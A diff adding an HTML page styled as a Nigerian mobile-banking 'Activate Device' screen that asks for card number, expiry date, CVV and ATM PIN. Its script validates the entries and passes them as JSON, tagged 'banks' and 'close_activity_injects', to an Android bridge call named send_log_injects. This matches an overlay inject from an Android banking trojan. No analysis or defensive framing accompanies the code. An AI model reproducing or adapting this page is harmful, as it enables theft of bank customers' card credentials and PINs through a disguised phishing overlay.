@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #192941;
+            color: #fff;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            text-align: center;
+            padding: 25px;
+            padding-bottom: 0;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            font-weight: 100;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 14px;
+        }
+
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: auto;
+            position: absolute;
+            z-index: 1;
+            left: 0;
+            top: 50%;
+            line-height: 1em;
+            color: #ffffff;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0.3em;
+            padding: 5px 0;
+            z-index: 99;
+            width: auto;
+            left: 0;
+        }
+
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #e2ac3b
+        }
+
+        .input {
+            border: 0;
+            border-bottom: 1px solid #fff;
+            margin-top: 15px;
+            padding-left: 0;
+            transition: all 0.2s ease;
+            color: #fff;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #e2ac3b;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important
+        }
+
+        footer {
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-gap: 10px;
+        }
+
+        .dotActive {
+            width: 8px;
+            height: 8px;
+            border: 0;
+            border-radius: 25px;
+            background-color: #e2ac3b;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border: 0;
+            border-radius: 25px;
+            background-color: #b9bfc6;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            font-weight: 600;
+            border: 0;
+            border-radius: 25px;
+            background-color: #e2ac3b;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <h5> Activate Device </h5>
+            <p style="font-size: 12px;font-weight: 100;margin-top: 20px;"> You can either use your Naira MasterCard or Verve Card to log in your mobile banking. </p>
+        </header>
+        <section>
+            <div class="cool-input">
+                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">Credit Card</span>
+            </div>
+            <div class="cool-input" style="float: left; width: 58%;">
+                <input type="tel" id="exp" name="exp" onkeyup="check7();check8()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">Expiration Date</span>
+            </div>
+            <div class="cool-input" style="float: right;width: 40%;">
+                <input type="password" id="cvv" name="cvv" onkeyup="check8()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">CVV</span>
+            </div>
+            <div style="clear:both;"></div>
+            <div class="cool-input">
+                <input type="password" id="pin" name="pin" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">ATM PIN</span>
+            </div>
+            <p style="font-size: 12px;font-weight: 100;margin-top: 20px; text-align: center;">Card details are not required for transaction after registration or activation.</p>
+            <input type="submit" class="button" id="sendData" value="CONTINUE">
+            <p style="font-size: 12px;font-weight: 600;margin-top: 20px; text-align: center;">ALREADY DONE WITH THIS STEP?</p>
+        </section>
+        <footer>
+            <div class="dotActive"></div>
+            <div class="dot"></div>
+        </footer>
+    </form>
+    <script>
+       $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+        $('#pin').mask('0000')
+
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var sendData = document.getElementById('sendData');
+
+
+        
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.pin = pin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
